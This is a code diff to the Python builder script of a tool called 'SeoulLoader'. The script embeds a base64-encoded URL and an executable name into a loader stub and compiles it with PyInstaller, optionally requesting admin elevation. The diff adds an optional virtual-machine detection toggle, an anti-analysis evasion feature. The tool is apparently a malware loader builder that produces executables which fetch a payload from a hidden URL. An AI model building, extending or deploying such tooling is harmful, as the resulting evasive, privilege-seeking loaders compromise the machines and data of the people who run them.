@@ -12,6 +12,13 @@ def main():
     if not name:
         print(Fore.RED + '[-] Executable Name is needed.' + Style.RESET_ALL)
 
+    detectvms = input('VM Check? (y/n): ')
+    detectvms = detectvms.strip().lower()
+    if detectvms == 'y':
+        detectvms = True
+    else:
+        detectvms = False
+
     try:
         encoded_url = base64.b64encode(url.encode()).decode()
         with open('stub/loader.py', 'r') as file:
@@ -19,6 +26,11 @@ def main():
 
         content = content.replace('_SEOUL_URL_', f'"{encoded_url}"')
         content = content.replace('_SEOUL_EXE_', f"{name}")
+        if detectvms == True:
+            pass
+        else:
+            content = content.replace('from vmdetect import check_vm as checkvm', '')
+            content = content.replace('vmdetection = checkvm()', 'vmdetection = False')
 
         if not os.path.exists('dist'):
             os.mkdir('dist')
@@ -34,12 +46,13 @@ def main():
             print(Fore.BLUE + '[*] Building Executable with admin...' + Style.RESET_ALL)
             print(Fore.YELLOW + '[*] Requesting admin privileges...' + Style.RESET_ALL)
             os.system(f'pyinstaller --onefile --uac-admin dist/built_loader.py --distpath dist --name SeoulLoader')
-            print(Fore.GREEN + '[+] Executable built successfully with admin privileges: dist/SeoulLoader.exe' + Style.RESET_ALL)
+            print(Fore.GREEN + '[+] Executable built successfully: dist/SeoulLoader.exe' + Style.RESET_ALL)
+            os.remove('dist/built_loader.py')
         else:
             print(Fore.YELLOW + '[*] No admin privileges will be requested.' + Style.RESET_ALL)
             os.system('pyinstaller --onefile dist/built_loader.py --distpath dist --name SeoulLoader')
             print(Fore.GREEN + '[+] Executable built successfully: dist/SeoulLoader.exe' + Style.RESET_ALL)
-            os.remove('dist/built_loader.py')
+            #os.remove('dist/built_loader.py')
 
     except FileNotFoundError:
         print(Fore.RED + '[-] Error: stub/loader.py not found.' + Style.RESET_ALL)
@@ -50,4 +63,4 @@ def main():
         sys.exit(1)
 
 if __name__ == '__main__':
-    print("Please run main.py instead of this file directly.")
+    print("Please run main.py or start.bat instead of this file directly.")
